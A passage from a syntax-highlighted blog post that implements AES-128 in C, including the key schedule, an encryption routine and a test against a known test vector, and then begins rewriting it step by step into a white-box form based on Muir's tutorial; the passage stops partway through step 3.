class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0x8D</span> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Key schedule -- Generate one subkey for each round</span>
</span><span class='line'>    <span class="c1">/// http://www.formaestudio.com/rijndaelinspector/archivos/Rijndael_Animation_v4_eng.swf</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// First round-key is the actual key</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">key</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>    <span class="n">d</span> <span class="o">=</span> <span class="n">DW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">12</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">11</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="c1">// Rotate `d` 8 bits to the right</span>
</span><span class='line'>        <span class="n">d</span> <span class="o">=</span> <span class="n">ROT</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// Takes every bytes of `d` &amp; substitute them using `S_box`</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">;</span>
</span><span class='line'>        <span class="c1">// Do not forget to xor this byte with `rcon[i]`</span>
</span><span class='line'>        <span class="n">a1</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[(</span><span class="n">d</span> <span class="o">&gt;&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">]</span> <span class="o">^</span> <span class="n">rcon</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="c1">// a1 is the LSB</span>
</span><span class='line'>        <span class="n">a2</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[(</span><span class="n">d</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">];</span>
</span><span class='line'>        <span class="n">a3</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[(</span><span class="n">d</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">];</span>
</span><span class='line'>        <span class="n">a4</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[(</span><span class="n">d</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">a2</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">a3</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">a4</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// Now we can generate the current roundkey using the previous one</span>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">d</span> <span class="o">^=</span> <span class="n">DW</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span><span class="p">]));</span>
</span><span class='line'>            <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span><span class="p">]))</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Dig in now</span>
</span><span class='line'>    <span class="c1">/// The initial round is just AddRoundKey with the first one (being the encryption key)</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>    <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Let&#39;s start the encryption process now</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">SubBytes</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">MixColumns</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Last round which is a bit different</span>
</span><span class='line'>    <span class="n">SubBytes</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Not that bad right? And we can even prepare a function that tests if the encrypted block is valid or not (this is really going to be useful as soon as we start to tweak the implementation):</p>

<figure class='code'><figcaption><span>tests</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">tests</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="c1">/// AES128ENC</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x3c</span> <span class="p">};</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">plain</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x34</span> <span class="p">};</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">expected</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x32</span> <span class="p">};</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&gt; aes128_enc_base ..&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">aes128_enc_base</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">expected</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;FAIL</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Brilliant.</p>

<h1>White-boxing AES128 in ~7 steps</h1>

<h2>Introduction</h2>

<p>I&rsquo;m no crypto-expert whatsoever but I&rsquo;ll still try to explain what &ldquo;white-boxing&rdquo; AES means for us. Currently, we have a block encryption primitive with the following signature <code>void aes128_enc_base(unsigned char in[16], unsigned char out[16], unsigned char key[16])</code>. One of the purpose of the white-boxing process is going to &ldquo;remove&rdquo;, or I should say &ldquo;hide&rdquo; instead, the key. Your primitive will work without any input key parameter, but the key won&rsquo;t be hard-coded either in the body of the function. You&rsquo;ll be able to encrypt things without any apparent key.</p>

<p>A perfectly secure but unpractical version of a white-box AES would be to have a big hash-table: the keys would be every single possible plain-texts and the values would be their encrypted version with the key you want. That should give you a really clear idea of what a white-box is. But obviously storing that kind of table in memory is another problem by itself :&ndash;).</p>

<p>Instead of using that &ldquo;naive&rdquo; idea, researchers came up with way to pre-compute &ldquo;things&rdquo; that involve the round-keys in order to hide everything. The other goal of a real white-box is to be resistant to reverse-engineering &amp; dynamic/static analysis. Even if you are able to read whatever memory you want, you still should not be able to extract the key. The <a href="https://github.com/0vercl0k/stuffz/tree/master/NoSuchCon2013">NoSuchCon2013</a> crackme is again a really good example of that: we had to wait for 2 years before <a href="https://twitter.com/doegox">@doegox</a> actually works his magic to extract the key.</p>

<p>The design of the implementation is really really important in order to make that key extraction process the most difficult.</p>

<p>In this part, we are using James A. Muir&rsquo;s <a href="https://github.com/0vercl0k/stuffz/raw/master/wbaes_attack/docs/a_tutorial_on_whitebox_aes.pdf">paper</a> to rewrite step by step our implementation in order to make it possible to combine several operations between them &amp; make pre-computed table out of them. At the end of this part we should have a working AES128 encryption primitive that doesn&rsquo;t require an hard-coded key. But we will also build in parallel a tool used to generate the different tables our implementation is going to need: obviously, this tool is going to need both the key schedule &amp; the encryption key to be able to generate the look-up tables.
Long story short: the first steps are basically going to reorder / rewrite the logic of the encryption, &amp; the last ones will really transform the implementation in a white-box.</p>

<p>Anyway, let&rsquo;s go folks!</p>

<h2>Step 1: bring the first <code>AddRoundKey</code> in the loop &amp; kick out the last one out of it</h2>

<p>This one is really easy: basically we just have to change our loop to start at <code>i=0</code> until <code>i=8</code> (inclusive), move the first <code>AddRoundKey</code> in the loop, and move the last one outside of it.</p>

<p>The encryption loop should look like this now:</p>

<figure class='code'><figcaption><span>aes128_enc_reorg_step1</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">aes128_enc_reorg_step1</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">in</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="c1">/// Key schedule -- Generate one subkey for each round</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">SubBytes</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">MixColumns</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">SubBytes</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Step 2: <code>SubBytes</code> then <code>ShiftRows</code> equals <code>ShiftRows</code> then <code>SubBytes</code></h2>

<p>Yet another easy one: because <code>SubBytes</code> is just replacing a byte by its substitution (stored in <code>S_box</code>), you can apply <code>ShiftRows</code> before <code>SubBytes</code> or <code>SubBytes</code> before <code>ShiftRows</code> ; you will get the same result. So let&rsquo;s exchange them:</p>

<figure class='code'><figcaption><span>aes128_enc_reorg_step2</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">aes128_enc_reorg_step2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">in</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="c1">/// Key schedule -- Generate one subkey for each round</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Let&#39;s start the encryption process now</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">SubBytes</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">MixColumns</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Last round which is a bit different</span>
</span><span class='line'>    <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">SubBytes</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Step 3: <code>ShiftRows</code> first, but needs to <code>ShiftRows</code> the round-key</h2>

<p>This one is a bit more tricky, but again it&rsquo;s more about reordering, rewriting the encryption loop than really replacing computation by look-up tables so far. Basically, the idea of this step is to start the encryption loop with a <code>ShiftRows</code> operation. Because of the way this operation is defined, if you put it first you also need to apply <code>ShiftRows</code> to the current round key in order to get the same result than <code>AddRoundKey</code>/<code>ShiftRows</code>.</p>

<figure class='code'><figcaption><span>aes128_enc_reorg_step3</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">aes128_enc_reorg_step3</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">in</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="c1">/// Key schedule -- Generate one subkey for each round</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="c1">/// Let&#39;s start the encryption process now</span>
